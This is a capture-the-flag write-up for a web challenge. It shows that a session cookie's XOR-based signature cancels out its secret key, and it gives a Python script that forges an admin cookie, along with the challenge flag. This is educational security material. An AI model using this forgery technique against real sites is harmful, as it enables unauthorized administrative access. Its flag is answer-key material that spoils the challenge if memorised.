# Cookies

## Category  
Web

## Description  
"Cookies cookies cookies" - Milk

We're given a web challenge where authentication and access seem to be handled via a session cookie. The objective is to understand the signature generation mechanism and forge a valid session token for the `admin` user.

## Files Provided  
- `cookie-utils.ts` (TypeScript source code for cookie signing)

## Access  
Challenge was available at:  
http://cookies.challenges.cybersecuritychallenge.be

## Write-up  
The cookie structure is as follows:

```
value|timestamp|signature
```

Example cookie:
```
guest|2025-03-14T12:09:19.838Z|VUVXRllXRkhCQDNEV0lEXk9USlpfRl0p
```

###  Signature Generation Logic

From the TypeScript file, we deduce that the signature is generated as:

```
signature = (((value ^ secret_key) ^ timestamp) ^ secret_key)
```

But because XOR is **commutative and associative**, we can simplify:

```
signature = value ^ secret_key ^ timestamp ^ secret_key
         = value ^ timestamp  (since secret_key ^ secret_key = 0)
```

###  Forgery Plan

So to forge a cookie as `admin`:

1. Extract the timestamp from the original session cookie.
2. XOR `admin` with the timestamp string to generate a valid signature.
3. Recreate the session cookie in this format:
```
admin|timestamp|<generated_signature>
```

## Python Script

```python
import base64

def xor_strings(str1: str, str2: str) -> str:
    length = max(len(str1), len(str2))
    return ''.join(
        chr(ord(str1[i % len(str1)]) ^ ord(str2[i % len(str2)]))
        for i in range(length)
    )

# Example usage
str1 = "admin"
str2 = "2025-03-14T12:06:22.873Z"

# XOR admin with timestamp
result = xor_strings(str1, str2)

# Base64 encode the result to match server's expected signature format
result = base64.b64encode(result.encode())
print("XOR Result:", result.decode())
```

Once you run this, you'll get a base64-encoded string you can use as the signature.

###  Final Forged Cookie

```
admin|2025-03-14T12:06:22.873Z|<generated_signature>
```

Replace the session cookie in your browser with this forged value, reload the page, and you will get access to the protected area.

## Flag  
```
CSC{I_LOV3_COOK13S}
```
